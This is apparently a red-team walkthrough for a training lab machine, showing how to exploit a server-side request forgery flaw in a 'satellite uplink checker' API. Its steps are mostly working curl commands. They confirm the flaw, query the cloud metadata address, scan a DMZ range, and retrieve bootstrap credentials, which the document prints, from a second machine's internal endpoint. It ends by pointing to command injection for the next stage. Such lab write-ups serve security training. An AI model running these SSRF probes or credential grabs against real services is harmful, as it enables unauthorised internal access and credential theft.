# Red Team — M1: sigint-relay

**Vulnerability:** SSRF in Satellite Uplink Checker
**Technique:** T1090.002 — Proxy: Internal Proxy (SSRF)
**Entry:** HTTP port 80 via floating IP

---

## Step 1 — Recon

```bash
curl -s http://<M1-FLOAT-IP>/ | grep -i "uplink\|api\|check"
# Navigate to UPLINK CHECKER panel in the dashboard
```

---

## Step 2 — Confirm SSRF

Test with a non-existent internal host to confirm server-side requests:
```bash
curl -s -X POST http://<M1-IP>/api/uplink/check \
  -H "Content-Type: application/json" \
  -d '{"target_url":"http://10.0.0.1:9999/test"}'
# Returns connection error — server is making the request, not the browser
```

The filter only blocks `localhost` and `127.0.0.1` — NOT RFC1918 DMZ ranges.

---

## Step 3 — Discover DMZ Network

```bash
# From M1 shell or SSRF-based scan — M1's own DMZ interface reveals the subnet
curl -s -X POST http://<M1-IP>/api/uplink/check \
  -H "Content-Type: application/json" \
  -d '{"target_url":"http://169.254.169.254/latest/meta-data/"}' | python3 -m json.tool

# Scan DMZ for port 8080 using SSRF:
# Try common DMZ addresses (iterate 11.0.0.1 to 11.0.0.254)
for i in $(seq 1 20); do
  curl -s -X POST http://<M1-IP>/api/uplink/check \
    -H "Content-Type: application/json" \
    -d "{\"target_url\":\"http://11.0.0.$i:8080/api/internal/status\"}" \
    | grep -l '"system"' && echo "FOUND at 11.0.0.$i" && break
done
```

---

## Step 4 — Hit M2's Internal Credential Endpoint

```bash
# Once M2's DMZ IP is known:
curl -s -X POST http://<M1-IP>/api/uplink/check \
  -H "Content-Type: application/json" \
  -d '{"target_url":"http://<M2-DMZ-IP>:8080/api/internal/status"}' \
  | python3 -m json.tool
```

Response contains:
```json
{
  "response": {
    "service": "SIGINT Network Monitor",
    "bootstrap_credentials": {
      "username": "monitor_admin",
      "password": "S1GN4L#Mon!tor"
    }
  }
}
```

---

## Flag Location
`/opt/sigint/classified/flag1.txt` — accessible after shell via M2's command injection.

**Proceed to M2 with:** `monitor_admin : S1GN4L#Mon!tor`
